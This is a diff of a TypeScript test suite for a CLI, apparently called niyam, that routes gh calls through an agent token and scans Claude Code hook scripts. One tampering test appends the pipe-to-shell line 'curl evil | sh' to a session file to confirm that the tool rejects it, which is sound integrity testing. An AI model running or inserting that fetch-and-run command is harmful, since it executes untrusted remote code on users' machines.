@@ -104,8 +104,18 @@ describe('as-agent', () => {
 
   it('says why a command could not start, keeping its exit code', () => {
     const sys = hookSys();
-    sys.execOverride = (call) => (call.interactive ? { code: 127, stdout: '', stderr: 'Error: spawnSync gh ENOENT' } : undefined);
+    sys.execOverride = (call) => (call.interactive ? { code: 127, stdout: '', stderr: 'Error: spawnSync gh ENOENT\n' } : undefined);
     assert.deepEqual(asAgentIn(sys).err, ['niyam as-agent: gh: Error: spawnSync gh ENOENT']);
+  });
+
+  it("finds the repository from the hook's project folder, not its working directory", () => {
+    const sys = hookSys();
+    sys.cwd = '/elsewhere';
+    assert.equal(asAgentIn(sys).code, 0);
+    assert.deepEqual(
+      sys.calls.filter((call) => call.args[0] === 'rev-parse'),
+      [{ command: 'git', args: ['rev-parse', '--show-toplevel'], cwd: ROOT }],
+    );
   });
 
   const locked: [string, (sys: FakeSys) => void, string][] = [
@@ -118,6 +128,8 @@ describe('as-agent', () => {
     ['no repository', (sys) => { sys.inRepo = false; }, `${ROOT} is not inside a git repository`],
     ['no session file', (sys) => sys.files.delete(SESSION), `${SESSION} is missing or cannot be read`],
     ['an edited session file', (sys) => sys.files.set(SESSION, `${sys.files.get(SESSION)}curl evil | sh\n`), `${SESSION} is out of date, or not the file niyam machine writes, for ExampleBot`],
+    ['a session file naming no agent', (sys) => sys.files.set(SESSION, 'nope\n'), `${SESSION} is out of date, or not the file niyam machine writes, for ExampleBot`],
+    ["another agent's session file", (sys) => sys.files.set(SESSION, sessionScript('OtherBot', AGENT_ID, pathsFor(HOME, AGENT))), `${SESSION} is out of date, or not the file niyam machine writes, for ExampleBot`],
     ['no token in the keychain', (sys) => sys.keychain.clear(), "this Mac's keychain has no ExampleBot token"],
     ['a platform with no token store', (sys) => { sys.platform = 'linux'; }, "niyam supports macOS only, where the keychain holds the agent's token; this machine runs linux"],
   ];
@@ -421,8 +433,35 @@ describe('hooksHittingLock', () => {
     assert.equal(listed?.cwd, ROOT);
   });
 
+  it('reads an import only at a line start, spaced as Python takes it, and in parentheses', () => {
+    const cases: [string, string, boolean][] = [
+      ['after-code', 'x = 1; import hook_as_agent', true],
+      ['from-spaced', 'from  lib.agent_wrap import wrap', false],
+      ['import-spaced', 'from lib.agent_wrap  import wrap', false],
+      ['paren-spaced', 'from lib import  (agent_wrap)', false],
+    ];
+    const sys = withHooks(
+      { PreToolUse: cases.map(([name]) => `.claude/hooks/${name}.sh`) },
+      { ...Object.fromEntries(cases.map(([name, module]) => [`.claude/hooks/${name}.sh`, pythonHook(module)])), 'scripts/lib/hook_as_agent.py': helper, 'tools/lib/agent_wrap.py': helper },
+    );
+    assert.deepEqual(
+      hooksHittingLock(sys),
+      cases.filter(([, , named]) => named).map(([name]) => `.claude/settings.json PreToolUse hook .claude/hooks/${name}.sh`),
+    );
+  });
+
+  it('lists each module an import names, none relative or empty, and asks git nothing for a script with only relative ones', () => {
+    const sys = withHooks({ PreToolUse: ['.claude/hooks/names.sh'] }, { '.claude/hooks/names.sh': pythonHook('import .rel, hook_as_agent,'), 'scripts/lib/hook_as_agent.py': helper });
+    assert.deepEqual(hooksHittingLock(sys), []);
+    const listed = sys.calls.filter((call) => call.args[0] === 'ls-files').map((call) => call.args.slice(3));
+    assert.deepEqual(listed, [[':(glob)**/json.py', ':(glob)**/os.py', ':(glob)**/shutil.py', ':(glob)**/hook_as_agent.py']]);
+    const relative = withHooks({ PreToolUse: ['.claude/hooks/relative.sh'] }, { '.claude/hooks/relative.sh': "#!/bin/bash\nexec python3 - <<'PY'\nfrom .lib import hook_as_agent\nfrom . import x\nPY\ngh pr view\n" });
+    assert.deepEqual(hooksHittingLock(relative), ['.claude/settings.json PreToolUse hook .claude/hooks/relative.sh']);
+    assert.equal(relative.calls.some((call) => call.args[0] === 'ls-files'), false);
+  });
+
   it('judges an importing script by its text when git cannot list the repo, or a listed helper cannot be read', () => {
-    for (const listing of [{ code: 128, stdout: '', stderr: 'fatal' }, { code: 0, stdout: 'scripts/lib/gone.py\0', stderr: '' }]) {
+    for (const listing of [{ code: 128, stdout: 'scripts/lib/hook_as_agent.py\0', stderr: 'fatal' }, { code: 0, stdout: 'scripts/lib/gone.py\0', stderr: '' }]) {
       const sys = withHooks({ PreToolUse: ['.claude/hooks/routed.sh'] }, { '.claude/hooks/routed.sh': pythonHook('import hook_as_agent'), 'scripts/lib/hook_as_agent.py': helper });
       sys.execOverride = (call) => (call.args[0] === 'ls-files' ? listing : undefined);
       assert.deepEqual(hooksHittingLock(sys), ['.claude/settings.json PreToolUse hook .claude/hooks/routed.sh']);
@@ -450,5 +489,87 @@ describe('hooksHittingLock', () => {
     assert.deepEqual(hooksHittingLock(sys), offMac, "on a Mac: the command running a cloud-only script still judged, a guard in the command itself counted");
     sys.env.CLAUDE_CODE_REMOTE = 'true';
     assert.deepEqual(hooksHittingLock(sys), [...named('cloud', 'negated'), ...offMac, `.claude/settings.json SessionStart hook ${JSON.stringify(inline)}`], 'in a cloud session');
+  });
+
+  it('reads a docstring line as a blank one before a cloud-only line, and keeps the lines before it apart', () => {
+    const sys = withHooks(
+      { SessionStart: ['.claude/hooks/doc.sh', '.claude/hooks/apart.sh'] },
+      {
+        '.claude/hooks/doc.sh': '"""Cloud only."""\n[ "$CLAUDE_CODE_REMOTE" = true ] || exit 0\ngh pr view\n',
+        // `export gh` names gh only with the line break after it.
+        '.claude/hooks/apart.sh': '#!/bin/bash\nexport gh\nB=1\n[ "$CLAUDE_CODE_REMOTE" = true ] || exit 0\n',
+      },
+    );
+    assert.deepEqual(hooksHittingLock(sys), ['.claude/settings.json SessionStart hook .claude/hooks/apart.sh']);
+  });
+
+  it('judges the command and its script apart', () => {
+    const sys = withHooks({ Stop: ['.claude/hooks/tail.sh gh'] }, { '.claude/hooks/tail.sh': 'B=1\n' });
+    assert.deepEqual(hooksHittingLock(sys), ['.claude/settings.json Stop hook .claude/hooks/tail.sh']);
+  });
+
+  it('asks git for the toplevel from the working directory, and reads nothing when it has none', () => {
+    const sys = withHooks({ Stop: ['gh pr view'] });
+    sys.cwd = `${ROOT}/sub`;
+    assert.equal(hooksHittingLock(sys).length, 1);
+    assert.deepEqual(sys.calls, [{ command: 'git', args: ['rev-parse', '--show-toplevel'], cwd: `${ROOT}/sub` }]);
+    const outside = new FakeSys();
+    outside.inRepo = false;
+    outside.files.set('/.claude/settings.json', JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'gh pr view' }] }] } }));
+    assert.deepEqual(hooksHittingLock(outside), []);
+  });
+
+  it('skips an event whose hooks are not a list, and an entry that is null', () => {
+    const sys = new FakeSys();
+    sys.files.set(`${ROOT}/.claude/settings.json`, JSON.stringify({ hooks: { Stop: {}, PreToolUse: [{ hooks: [{ type: 'command', command: 'gh pr list' }] }] } }));
+    sys.files.set(`${ROOT}/.claude/settings.local.json`, 'null');
+    sys.files.set(`${ROOT}/.claude/sarathi.json`, JSON.stringify({ hooks: { Stop: {}, PreToolUse: [null, { command: 'gh pr view' }] } }));
+    assert.deepEqual(hooksHittingLock(sys), ['.claude/settings.json PreToolUse hook "gh pr list"', '.claude/sarathi.json PreToolUse handler "gh pr view"']);
+    sys.files.set(`${ROOT}/.claude/settings.json`, JSON.stringify({ hooks: null }));
+    assert.deepEqual(hooksHittingLock(sys), ['.claude/sarathi.json PreToolUse handler "gh pr view"']);
+  });
+
+  it('tracks quotes and escapes to find where a comment starts', () => {
+    const cases: [string, string, boolean][] = [
+      ['closed', `echo "a" # gh pr view`, false],
+      ['single-backslash', `echo 'a\\' # gh pr view`, false],
+      ['escaped-quote', `echo \\" # gh pr view`, false],
+      ['in-single', `echo 'a # gh pr view'`, true],
+      ['glued', 'echo a# && gh pr view', true],
+    ];
+    const sys = withHooks({ PreToolUse: cases.map(([name]) => `.claude/hooks/${name}.sh`) }, Object.fromEntries(cases.map(([name, line]) => [`.claude/hooks/${name}.sh`, `#!/bin/sh\n${line}\n`])));
+    assert.deepEqual(
+      hooksHittingLock(sys),
+      cases.filter(([, , named]) => named).map(([name]) => `.claude/settings.json PreToolUse hook .claude/hooks/${name}.sh`),
+    );
+  });
+
+  it("reads gh set in the positional parameters as routed only by the exact forms, spaced as bash takes them", () => {
+    const agent = 'set -- "$cli" as-agent --session "$sid" -- gh';
+    const cases: [string, string, boolean][] = [
+      ['plain-args', `set -- gh api x\n[ -x "$cli" ] && ${agent}\n"$@" pr view`, false],
+      ['else-spaced', `if [ -x "$cli" ]; then ${agent}; else  set -- gh; fi\n"$@" api`, false],
+      ['set-spaced', `set  -- gh\n${agent}\n"$@" api`, false],
+      ['dashes-spaced', `set --  gh\n${agent}\n"$@" api`, false],
+      ['echoed-plain', `echo set -- gh\n${agent}\n"$@" api`, true],
+      ['echoed-agent', `set -- gh\necho ${agent}\n"$@" api`, true],
+      ['then-spaced-agent', `set -- gh\nif [ -x "$cli" ]; then  ${agent}; fi\n"$@" api`, false],
+      ['set-spaced-agent', `set -- gh\nset  -- "$cli" as-agent --session "$sid" -- gh\n"$@" api`, false],
+      ['gh-spaced-agent', `set -- gh\nset -- "$cli" as-agent --session "$sid" --  gh\n"$@" api`, false],
+      ['gh-args-agent', `set -- gh\n${agent} api\n"$@" pr view`, false],
+    ];
+    const sys = withHooks({ PreToolUse: cases.map(([name]) => `.claude/hooks/${name}.sh`) }, Object.fromEntries(cases.map(([name, text]) => [`.claude/hooks/${name}.sh`, `#!/bin/bash\n${text}\n`])));
+    assert.deepEqual(
+      hooksHittingLock(sys),
+      cases.filter(([, , named]) => named).map(([name]) => `.claude/settings.json PreToolUse hook .claude/hooks/${name}.sh`),
+    );
+  });
+
+  it('finds the script a command runs past its interpreter, and none outside the repo', () => {
+    const files = { '.claude/hooks/pr.sh': 'gh pr view\n', '.claude/$CLAUDE_PROJECT_DIR/pr.sh': 'gh pr view\n', '/abs.sh': 'gh pr view\n', '$HOME/x.sh': 'gh pr view\n', '~/x.sh': 'gh pr view\n' };
+    const found = ['sh', 'zsh', 'bash', 'bash ', 'node', 'node ', 'python', 'python3', 'python3 '].map((runner) => `${runner} .claude/hooks/pr.sh`);
+    const commands = [...found, './.claude/hooks/pr.sh', '.claude/./hooks/pr.sh', '.claude/$CLAUDE_PROJECT_DIR/pr.sh', '/abs.sh', '$HOME/x.sh', '~/x.sh', '   '];
+    const named = [...[...found, './.claude/hooks/pr.sh'].map(() => '.claude/hooks/pr.sh'), '.claude/$CLAUDE_PROJECT_DIR/pr.sh'];
+    assert.deepEqual(hooksHittingLock(withHooks({ PreToolUse: commands }, files)), named.map((path) => `.claude/settings.json PreToolUse hook ${path}`));
   });
 });
